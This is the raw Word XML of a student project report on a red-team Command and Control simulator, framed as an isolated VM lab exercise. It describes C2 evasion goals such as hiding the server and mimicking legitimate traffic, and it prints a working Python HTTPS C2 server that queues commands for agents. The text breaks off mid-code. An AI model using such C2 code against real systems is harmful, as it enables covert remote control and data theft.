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071F" w14:textId="77777777" w:rsidR="00A62571" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Project Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A232380" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Command and Control (C2) Simulator for Red Teaming</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6115CD6D" w14:textId="37ED11B6" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Name: </w:t>
      </w:r>
      <w:r w:rsidR="00D00657">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Priyanshi Panchal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C76A5F7" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Degree Program: Bachelor of Computer Applications (BCA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC9C6A1" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>University: Rabindranath Tagore University, Bhopal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD5D66B" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Year of Completion: 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8FAF19" w14:textId="64ABF6E1" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Email: </w:t>
      </w:r>
      <w:r w:rsidR="0005403D" w:rsidRPr="0005403D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>priyanshipanchal205</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>@gmail.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063D1F0A" w14:textId="761486C7" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">LinkedIn: </w:t>
      </w:r>
      <w:r w:rsidR="009B2607" w:rsidRPr="009B2607">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>www.linkedin.com/in/priyanshi-panchal-a08b50376</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023F2B1D" w14:textId="74BE6C0F" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="00000000" w:rsidP="005E5517">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">GitHub: </w:t>
      </w:r>
      <w:r w:rsidR="00D00657" w:rsidRPr="00D00657">
        <w:t>https://github.com/Priyanshi04panchal/Command-and-Control-C2-Simulator-for-Red-Teaming-Objective</w:t>
      </w:r>
      <w:r w:rsidR="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005E5517" w:rsidRPr="005E5517">
        <w:rPr>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="005E5517" w:rsidRPr="005E5517">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>NTRODUCTION</w:t>
      </w:r>
      <w:r w:rsidR="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005E5517" w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>C2 infrastructure is built with the intent to pursue several goals:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C659B80" w14:textId="77777777" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="005E5517" w:rsidP="005E5517">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>hide the true location of the C2 server;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710B5E88" w14:textId="77777777" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="005E5517" w:rsidP="005E5517">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>mimic legitimate communication;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3680DD" w14:textId="77777777" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="005E5517" w:rsidP="005E5517">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>allow only malware control traffic to reach the real C2 server;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FA890F" w14:textId="77777777" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="005E5517" w:rsidP="005E5517">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>be reliable — given detection the part of C2 infrastructure, still, maintain C2 channel to the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7368D811" w14:textId="7AEA4023" w:rsidR="005E5517" w:rsidRPr="005E5517" w:rsidRDefault="005E5517" w:rsidP="005E5517">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Simple port forwarding by tools like </w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>socat </w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>or SSH can solve bullet #1 and partly #4. However, to address bullets #2 and #3 we need to introduce more sophisticated redirectors — hosts, which act as reverse proxies to forward only specific traffic to the real C2 server, whilst serving counterfeit content for the arbitrary visitor. In this article, we will focus on HTTPS as a protocol for external C2 communication. A high-level overview of such design is visualized in Figure 1 below:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07AB70FC" wp14:editId="43634356">
            <wp:extent cx="5486400" cy="2919095"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="172977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73992" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2919095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DC64A6" w14:textId="1835F94B" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00A62571">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F0E1FFA" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Project Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BED9469" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">To design and implement a simulated Command and Control (C2) server and agent system for ethical red team exercises within a controlled virtual lab environment. This project helps </w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>demonstrate the key concepts used in red teaming, such as remote command execution, encrypted communication, and stealth mechanisms.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74634AC5" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Tools &amp; Technologies Used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20386479" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Programming Language: Python 3</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Network Protocol: HTTPS (with self-signed certificates for encrypted communication)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Virtualization: VirtualBox, Vagrant</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Operating Systems: Linux (Ubuntu Server for C2 and Agent VMs)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Python Libraries: requests, http.server, ssl, pynput, pyautogui, subprocess, os, base64, time, threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E734801" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Architecture Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179E243C" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>C2 Server: Accepts HTTPS connections, issues commands, and processes output including screenshots and keystrokes.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Agent: Periodically beacons to server, executes received commands, and sends results.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Communication Model: Encrypted communication using self-signed certificates over HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E0CB6B" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Lab Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E8957F" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Two Ubuntu VMs created using Vagrant and VirtualBox:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> - One acts as the C2 server</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> - One (or more) acts as the Agent</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Network: Host-only network configuration to enable secure and isolated communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBC09DF" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Implementation Details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD37699" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The project includes two Python scripts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A79831A" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>C2 Server (c2_server.py)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A76D23" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>import http.server</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import json</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import base64</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>commands = []</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>class C2RequestHandler(http.server.BaseHTTPRequestHandler):</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    def do_GET(self):</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        if commands:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            response = commands.pop(0)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            response = ''</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        self.send_response(200)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        self.send_header('Content-type', 'application/json')</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        self.end_headers()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        self.wfile.write(json.dumps({'cmd': response}).encode())</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    def do_POST(self):</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        content_length = int(self.headers['Content-Length'])</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        post_data = self.rfile.read(content_length)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        data = json.loads(post_data.decode())</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Received from Agent: {data}")</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        self.send_response(200)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        self.end_headers()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>def run_server():</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    server_address = ('0.0.0.0', 4443)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    httpd = http.server.HTTPServer(server_address, C2RequestHandler)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='key.pem', certfile='cert.pem', server_side=True)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] C2 Server running on port 4443...")</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    httpd.serve_forever()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>if __name__ == '__main__':</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        cmd = input("Enter command to send to agent: ")</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        commands.append(cmd)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
